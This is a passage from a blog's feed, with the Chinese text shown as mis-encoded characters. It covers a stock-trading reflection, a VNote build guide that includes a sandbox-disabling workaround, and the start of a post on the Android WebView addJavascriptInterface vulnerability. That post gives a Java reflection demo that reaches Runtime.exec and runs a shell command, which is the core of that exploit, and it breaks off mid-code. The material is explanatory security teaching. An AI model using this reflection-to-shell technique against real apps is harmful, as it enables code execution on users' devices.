æœ¬æœ‰ç”¨å‘¢ï¼Ÿæ‰€ä»¥ç‚’è‚¡å¹¶ä¸å­˜åœ¨ä»€ä¹ˆæ·å¾„ï¼Œä¸€å¤œæš´å¯ŒåŸºæœ¬æ˜¯ç¥è¯ï¼Œä¸ºå•¥å‘¢ï¼Ÿç›ˆäºåŒæºï¼Œæ€ä¹ˆèµšé’±å°±å¯èƒ½æ€ä¹ˆäºå›å»ï¼Œé™¤éä½ çŸ¥é“ä½ ä¸ºä»€ä¹ˆèƒ½èµšé’±ã€‚</p><p>ä¸‹é¢æ˜¯è¿™äº›å¹´çš„å¿ƒå¾—ï¼Œåº”è¯¥å¯ä»¥æ¶¨å‡ å¹´åŠŸåŠ›å§ï¼Ÿ</p><p>è¦åœ¨å¸‚åœºä¸Šç”Ÿå­˜ä½ å¿…é¡»å…·å¤‡æŸç§ä¼˜åŠ¿ï¼Œæ²¡æœ‰è¿™ç§ä¼˜åŠ¿å°±æ˜¯çº¯èµŒåšï¼ŒçœŸæ­£èµšé’±çš„æ˜¯è¦åšå¤§æ¦‚ç‡çš„æŠ•æœºã€‚ä¹°å–è‚¡ç¥¨å®é™…ä¸Šæ˜¯å¯¹è‚¡ç¥¨åšåˆ†ç±»ï¼Œå“ªäº›å¯ä»¥åšï¼Œå“ªäº›ä¸å¯ä»¥åšï¼Œè¿™å°±æ¶‰åŠäº†è‚¡ç¥¨äº¤æ˜“ç³»ç»Ÿï¼Œæœ‰äº†äº¤æ˜“ç³»ç»Ÿï¼Œå‰©ä¸‹çš„å°±æ˜¯æ‰§è¡Œé—®é¢˜äº†ï¼Œè¦åšåˆ°BDWQï¼Œåé¢å°±æ˜¯ä»“ä½è®¡ç®—ï¼Œæ ¹æ®è‚¡ç¥¨çš„æ³¢åŠ¨å’Œä½ æ„¿æ„æ‰¿æ‹…çš„é£é™©ç¨‹åº¦è®¡ç®—å‡ºæ¥ã€‚</p><p>å›é¦–çœ‹è™½ç„¶ç°åœ¨ç¨³å®šç›ˆåˆ©äº†ï¼Œåˆå›åˆ°äº†çµé­‚æ‹·é—®ï¼ŒæŠ•å…¥çš„æ—¶é—´å€¼å¾—å—ï¼Ÿå¯¹äºå¾ˆå¤šäººæ¥è¯´ï¼Œæœ€é‡è¦å¯èƒ½æ˜¯èµ„é‡‘çš„åŸå§‹ç§¯ç´¯ï¼Œ10ä¸‡å—ï¼Œç¿»10å€ï¼Œ100ä¸‡åœ¨ä¸­å›½å¾ˆå¤šåŸå¸‚ä¸€å¥—æˆ¿ä¹Ÿä¹°ä¸äº†ï¼Œæ›´ä¸ç”¨è¯´è´¢å¯Œè‡ªç”±äº†ï¼Œæ‰€ä»¥å…ˆåŠªåŠ›å·¥ä½œå§ï¼Œè¾¹å·¥ä½œè¾¹åŠ å¤§æŠ•èµ„æ¯”ä¾‹ï¼Œæ¢¦æƒ³è¿˜æ˜¯è¦æœ‰çš„ï¼Œä¸‡ä¸€å®ç°äº†å‘¢ï¼Ÿ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ¬äººITç”·ä¸€æšï¼Œ2015å¹´å…¥å¸‚ï¼Œåˆ°ä»Šå¤©5å¹´å¤šäº†ï¼Œæ‰€å¹¸è¿˜åœ¨åƒäººä¸éœ²éª¨å¤´çš„å¸‚åœºä¸Šæ´»ç€ï¼Œä¹Ÿæ˜¯éå¸¸ä¸å®¹æ˜“ã€‚åŸºæœ¬ä¸å­˜åœ¨ä»€ä¹ˆç‰¹æ®Šæƒ…å†µï¼ŒéŸ­èœæ€»æ˜¯åœ¨äººå£°é¼æ²¸çš„ç‰›å¸‚é«˜ç‚¹å…¥åœºï¼Œæœ¬äººä¹Ÿä¸ä¾‹å¤–ï¼Œä¸Šè¯3500å¤šç‚¹å…¥å¸‚ï¼Œä¸Šè¯3800å¤šç‚¹è®©åª³å¦‡ä¹°äº†æ²ªæ·± 300 åŸºé‡‘ ï¼ˆä¸æ˜¯ETFï¼‰ï¼Œè¿™åŸºé‡‘ä»Šå¹´æ‰è§£å¥—ï¼Œå°</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>Markdown ç¬”è®°è½¯ä»¶ï¼š VNote</title>
    <link href="http://usmacd.com/2021/11/29/vnote/"/>
    <id>http://usmacd.com/2021/11/29/vnote/</id>
    <published>2021-11-28T16:00:00.000Z</published>
    <updated>2022-08-01T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>å‘å¤§å®¶å®‰åˆ©ä¸€æ¬¾ markdown ç¬”è®°è½¯ä»¶ï¼Œ VNote <a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a><br>æ­¤è½¯ä»¶ç›®å‰å·²ç» 1300 å¤šä¸ªcommits äº†ï¼Œåšä¸ºä¸€ä¸ªæœ‰äº›å¼€æºè½¯ä»¶ç»´æŠ¤ç»å†çš„äººï¼Œæ·±æ„Ÿä¸æ˜“ã€‚<br>ç”¨äº†å¤ªå¤š markdown ç¬”è®°è½¯ä»¶ï¼Œæ­¤è½¯ä»¶ä½¿å¾—æœ€ä¸ºé¡ºæ‰‹ï¼Œå°¤å…¶ä½œä¸ºç¨‹åºå‘˜ vim æ¨¡å¼ è®©æˆ‘æ„Ÿåˆ°éå¸¸èˆ’æœï¼Œ<br>å¤§é‡å›¾è¡¨çš„æ”¯æŒæ¯”å¦‚ UML æµç¨‹å›¾ï¼Œè®©æˆ‘ç”¨èµ·æ¥å¾ˆé¡ºæ‰‹ã€‚</p><p>Vnote åˆ†ä¸ºä¸¤ä¸ªå¼€å‘é˜¶æ®µï¼Œé˜¶æ®µä¸€ vnote2 å·²ç»å¼€å‘å®Œæˆï¼š<a href="https://github.com/vnotex/vnote/tree/vnote2">https://github.com/vnotex/vnote/tree/vnote2</a><br>ç°åœ¨å¤„äºç¬¬äºŒä¸ªå¼€å‘é˜¶æ®µï¼š<a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a></p><p>æ®è¯´åç»­ä¼šå‡ºæ”¶è´¹ç‰ˆæœ¬ï¼Œä½†ç›®å‰çœ‹è¿˜éœ€è¦å¾ˆé•¿çš„ä¸€æ®µæ—¶é—´äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/vnote.png" alt="VNote"></p><p>æˆ‘å‰åå°è¯•è¿‡å„ç§ç¬”è®°è½¯ä»¶ï¼Œæˆ‘ç†æƒ³çš„è½¯ä»¶æœ‰å‡ ç‚¹ï¼š</p><ul><li>a. æ”¯æŒæ–‡ä»¶ç®¡ç†</li><li>b. ä¸è¦ä¹±æ”¹æ•°æ®ï¼Œå®¹æ˜“è¿ç§»</li><li>c. æ”¯æŒ markdown</li><li>d. è·¨å¹³å°ï¼Œæ”¯æŒ Mac å’Œ Linux</li></ul><p>æœ€åï¼Œç»ˆäºå‘ç°äº† VNoteï¼Œæœ‰ç‚¹æƒŠå–œã€‚åœ¨ Linux ä¸‹ç¼–è¯‘ VNote æ˜¾ç¤ºæœ‰æ˜æ˜¾æ”¹è¿›ï¼Œä¸‹é¢æ˜¯ç¼–è¯‘çš„æ–¹æ³•ï¼š</p><ol><li>ä¸‹è½½ QT SDK  ï¼ˆæœ€æ–°çš„ vnotex å®˜æ–¹æ”¯æŒ Qt 5.15.2ï¼Œå¯è‡ªè¡Œä¸‹è½½ä½¿ç”¨æ›¿æ¢ç›¸åº”çš„ç‰ˆæœ¬å³å¯ï¼‰</li></ol><p><a href="https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run">https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run</a></p><p>å°† Qt5.9 å®‰è£…åˆ° &#x2F;home&#x2F;henices&#x2F;Qt5.9.0&#x2F;</p><ol start="2"><li>ç¼–è¯‘ fcitx-qt5 ï¼ˆå¦‚æœä½¿ç”¨çš„æ˜¯ fcitx5ï¼Œéœ€è¦ä¸‹è½½ç¼–è¯‘ fcitx5-qtï¼‰</li></ol><p>git clone <a href="https://gitlab.com/fcitx/fcitx-qt5.git">https://gitlab.com/fcitx/fcitx-qt5.git</a></p><p>å‡†å¤‡ç¼–è¯‘è„šæœ¬ <code>build_linux.sh</code>ï¼Œ æŒ‡å®šä¸‹è½½çš„QT</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">QTDIR=<span class="string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span></span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$QTDIR</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">LDFLAGS=-L<span class="variable">$QTDIR</span>/lib</span><br><span class="line">CPPFLAGS=-I<span class="variable">$QTDIR</span>/include</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf build</span><br><span class="line"><span class="built_in">mkdir</span> -p build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤ç¼–è¯‘</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> a+x ./build_linux.sh</span><br><span class="line">./build_linux.sh</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„ libfcitxplatforminputcontextplugin.so copy åˆ°<br><code>/home/henices/Qt5.9.0/5.9/gcc_64/plugins/platforminputcontexts/</code></p><ol start="3"><li>è·å–VNote æºç </li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tamlok/vnote.git vnote.git</span><br><span class="line"><span class="built_in">cd</span> vnote.git</span><br><span class="line">git submodule update --init</span><br></pre></td></tr></table></figure><ol start="4"><li>ç¼–è¯‘</li></ol><p>build_linux.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QTDIR=<span class="string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span></span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$QTDIR</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">LDFLAGS=-L<span class="variable">$QTDIR</span>/lib</span><br><span class="line">CPPFLAGS=-I<span class="variable">$QTDIR</span>/include</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf build</span><br><span class="line"><span class="built_in">mkdir</span> -p build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">qmake -v</span><br><span class="line">qmake PREFIX=/usr/local CONFIG-=debug CONFIG+=release ../VNote.pro</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤ç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x ./build_linux.sh</span><br><span class="line">./build_linux.sh</span><br></pre></td></tr></table></figure><ol start="5"><li>å®‰è£…</li></ol><p><code>sudo make install</code></p><h2 id="è¯¡å¼‚é—®é¢˜"><a href="#è¯¡å¼‚é—®é¢˜" class="headerlink" title="è¯¡å¼‚é—®é¢˜"></a>è¯¡å¼‚é—®é¢˜</h2><p>Fedora å‡çº§åˆ° 35 åï¼ŒVnote å‡ºç°äº†ä¸€ç³»åˆ—é—®é¢˜</p><ol><li><p>vnote çš„é˜…è¯»æ¨¡å¼ä¸èƒ½æ­£å¸¸æ˜¾ç¤º ï¼ˆQt 5.12.11ï¼‰</p><p>è§£å†³è¿™ä¸ªé—®é¢˜éœ€è¦ç¦ç”¨ Qtwebengine çš„ sandbox</p></li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./vnote --no-sandbox</span><br></pre></td></tr></table></figure><ol start="2"><li>å¯¼å‡º pdf æ–‡ä»¶ cpu 100%  ï¼ˆFedora ç³»ç»Ÿè‡ªå¸¦ Qt 5.15.2 ç¼–è¯‘ï¼‰</li><li>å®˜æ–¹æä¾›çš„ Linux AppImage æ–‡ä»¶æ— æ³•æ‰“å¼€ Fcitx5 è¾“å…¥æ³•ã€‚</li></ol><p>æœ€ç»ˆè§£å†³é—®é¢˜çš„æ–¹æ³•æ˜¯ä¸‹è½½ Qt5.15.2 é‡æ–°ç¼–è¯‘ Vnoteï¼Œ Qt ä» 5.15 å¼€å§‹ä¸æä¾›ç¦»çº¿å®‰è£…åŒ…ï¼Œéå¸¸ä¸æ–¹ä¾¿ã€‚<br>å®˜æ–¹æä¾›çš„åœ¨çº¿å‡çº§åŒ…å¦‚æœå¤ªæ–°åªèƒ½å®‰è£… Qt 6ï¼Œæ‰€ä»¥å¿…é¡»ä¸‹è½½è€ç‰ˆæœ¬çš„ online installer<br><a href="https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run">https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run</a></p><p>å…·ä½“å†…å®¹å¯ä»¥å‚è€ƒ <a href="https://github.com/vnotex/vnote/issues/1942">https://github.com/vnotex/vnote/issues/1942</a> çš„è®¨è®º</p><p>2022.8.2 æ›´æ–°</p><p>å¯¼å‡º pdf æ–‡ä»¶ cpu 100% çš„é—®é¢˜ï¼Œæˆ‘è°ƒè¯• Qt 5.15.5 ä»£ç æ—¶å·²ç»è§£å†³ï¼Œå¯ä»¥å‚è€ƒï¼š<br><a href="https://github.com/vnotex/vnote/commit/53e2b3bfa8aff4f590471caf5e8cc55c8b8b538b">https://github.com/vnotex/vnote/commit/53e2b3bfa8aff4f590471caf5e8cc55c8b8b538b</a></p><h3 id="Qt-5-15-3"><a href="#Qt-5-15-3" class="headerlink" title="Qt 5.15.3"></a>Qt 5.15.3</h3><p>ä½¿ç”¨ Qt 5.15.3 ç¼–è¯‘ VNOte åï¼Œå‡ºç°ä¸‹é¢çš„æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[695784:695784:0401/181224.580254:ERROR:network_service_instance_impl.cc(286)] Network service crashed, restarting service.</span><br></pre></td></tr></table></figure><p>bug åœ¨è¿™ <a href="https://bugreports.qt.io/browse/QTBUG-91715">https://bugreports.qt.io/browse/QTBUG-91715</a> å¯ä»¥å…ˆä½¿ç”¨ç¯å¢ƒå˜é‡æ•‘æ€¥ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QTWEBENGINE_DISABLE_SANDBOX=1 QTWEBENGINE_CHROMIUM_FLAGS=--lang=de ./vnote --no-sandbox --disable-gpu</span><br></pre></td></tr></table></figure><p>2022.8.2 æ›´æ–°</p><p>Qt 5.15.5 å·²ç»ä¿®å¤äº†è¿™ä¸ªé—®é¢˜ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md">https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‘å¤§å®¶å®‰åˆ©ä¸€æ¬¾ markdown ç¬”è®°è½¯ä»¶ï¼Œ VNote &lt;a href=&quot;https://github.com/vnotex/vnote&quot;&gt;https://github.com/vnotex/vnote&lt;/a&gt;&lt;br&gt;æ­¤è½¯ä»¶ç›®å‰å·²ç» 1300 å¤šä¸ªcommits äº†ï¼Œåšä¸º</summary>
      
    
    
    
    
    <category term="Programming" scheme="http://usmacd.com/tags/Programming/"/>
    
    <category term="Software" scheme="http://usmacd.com/tags/Software/"/>
    
  </entry>
  
  <entry>
    <title>Android WebView æ¼æ´</title>
    <link href="http://usmacd.com/2021/11/05/webview_java/"/>
    <id>http://usmacd.com/2021/11/05/webview_java/</id>
    <published>2021-11-05T09:56:07.025Z</published>
    <updated>2021-11-05T09:56:07.025Z</updated>
    
    <content type="html"><![CDATA[<h2 id="â˜†-æ¥è‡ª-developer-android-com-çš„ä¿¡æ¯"><a href="#â˜†-æ¥è‡ª-developer-android-com-çš„ä¿¡æ¯" class="headerlink" title="â˜† æ¥è‡ª developer.android.com çš„ä¿¡æ¯"></a>â˜† æ¥è‡ª developer.android.com çš„ä¿¡æ¯</h2><p>Android å®˜æ–¹ç½‘ç«™å¯¹addJavascriptInterfaceçš„ä»‹ç»å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void addJavascriptInterface (Object object, String name)  Added in API level 1</span><br><span class="line"></span><br><span class="line">Injects the supplied Java object into this WebView. The object is injected into</span><br><span class="line">the JavaScript context of the main frame, using the supplied name. This allows </span><br><span class="line">the Java object&#x27;s methods to be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN_MR1 and above, only public methods that are </span><br><span class="line">annotated with JavascriptInterface can be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN or below, all public methods (including the inherited ones)</span><br><span class="line">can be accessed, see the important security note below for implications.</span><br><span class="line"></span><br><span class="line">Note that injected objects will not appear in JavaScript until the page is next</span><br><span class="line">(re)loaded. For example:</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">   <span class="meta">@JavascriptInterface</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;injectedObject&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(), <span class="string">&quot;injectedObject&quot;</span>);</span><br><span class="line">webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">webView.loadUrl(<span class="string">&quot;javascript:alert(injectedObject.toString())&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">This method can be used to allow JavaScript to control the host application. </span><br><span class="line">This is a powerful feature, but also presents a security risk for apps targeting</span><br><span class="line">JELLY_BEAN or earlier. Apps that target a version later than JELLY_BEAN are still</span><br><span class="line">vulnerable if the app runs on a device running Android earlier than 4.2. The </span><br><span class="line">most secure way to use this method is to target JELLY_BEAN_MR1 and to ensure the</span><br><span class="line">method is called only when running on Android 4.2 or later. With these older </span><br><span class="line">versions, JavaScript could use reflection to access an injected object&#x27;s public</span><br><span class="line">fields. Use of this method in a WebView containing untrusted content could allow</span><br><span class="line">an attacker to manipulate the host application in unintended ways, executing </span><br><span class="line">Java code with the permissions of the host application. Use extreme care when </span><br><span class="line">using this method in a WebView which could contain untrusted content.</span><br><span class="line">JavaScript interacts with Java object on a private, background thread of this </span><br><span class="line">WebView. Care is therefore required to maintain thread safety.</span><br><span class="line"></span><br><span class="line">The Java object&#x27;s fields are not accessible.</span><br><span class="line">For applications targeted to API level LOLLIPOP and above, methods of injected </span><br><span class="line">Java objects are enumerable from JavaScript. Parameters object the Java object </span><br><span class="line">to inject into this WebView&#x27;s JavaScript context. Null values are ignored.</span><br><span class="line">name  the name used to expose the object in JavaScript</span><br></pre></td></tr></table></figure><p>  ä¹‹æ‰€ä»¥æä¾›addJavascriptInterfaceæ˜¯ä¸ºäº†WebViewä¸­çš„Javascriptå¯ä»¥å’Œæœ¬åœ°çš„App<br>  é€šè®¯ï¼Œè¿™ç¡®å®æ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œè¿™ä¹ˆåšçš„å¥½å¤„åœ¨äºæœ¬åœ°Appé€»è¾‘ä¸å˜çš„æƒ…å†µä¸‹ï¼Œä¸<br>  éœ€è¦å‡çº§Appå°±å¯ä»¥å¯¹ç¨‹åºè¿›è¡Œæ›´æ–°ï¼Œä¿®æ”¹ç›¸åº”çš„Webé¡µé¢å°±å¯ä»¥äº†ã€‚</p><h2 id="â˜†-ç›¸å…³çŸ¥è¯†"><a href="#â˜†-ç›¸å…³çŸ¥è¯†" class="headerlink" title="â˜† ç›¸å…³çŸ¥è¯†"></a>â˜† ç›¸å…³çŸ¥è¯†</h2><h3 id="WebViewçš„ä½¿ç”¨æ–¹æ³•"><a href="#WebViewçš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="WebViewçš„ä½¿ç”¨æ–¹æ³•"></a>WebViewçš„ä½¿ç”¨æ–¹æ³•</h3><p>  åœ¨layoutä¸­å®šä¹‰ <webview>, åœ¨Activityçš„onCreateä¸­åŠ å…¥ä¸‹é¢çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>);</span><br><span class="line">setContentView(webview);</span><br><span class="line">webview.loadUrl(<span class="string">&quot;http://slashdot.org/&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h3><p>  åå°„æ˜¯javaè¯­è¨€æä¾›çš„ä¸€ç§æœºåˆ¶ï¼Œä½¿Javaç¨‹åºå¯ä»¥åœ¨è¿è¡Œæ—¶æ£€æŸ¥ç±»ã€æ¥å£ã€æ–¹æ³•å’Œæˆå‘˜ï¼Œ<br>è€Œä¸éœ€è¦åœ¨ç¼–è¯‘çš„æ—¶å€™çŸ¥é“ç±»çš„åå­—å’Œæ–¹æ³•ç­‰ç»†èŠ‚ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a1</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a2</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">mObjectClass</span> <span class="operator">=</span> demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> mObjectClass.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        String[] array = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id &gt; /tmp/id&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">n</span> <span class="operator">=</span> c2.getMethod(<span class="string">&quot;exec&quot;</span>, array.getClass());</span><br><span class="line">        n.invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;array&#125;);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a2</span><br><span class="line">method = a1</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = equals</span><br><span class="line">method = toString</span><br><span class="line">method = hashCode</span><br><span class="line">method = getClass</span><br><span class="line">method = notify</span><br><span class="line">method = notifyAll</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚</p><h3 id="é€šè¿‡reflection-è®¿é—®private"><a href="#é€šè¿‡reflection-è®¿é—®private" class="headerlink" title="é€šè¿‡reflection è®¿é—®private"></a>é€šè¿‡reflection è®¿é—®private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 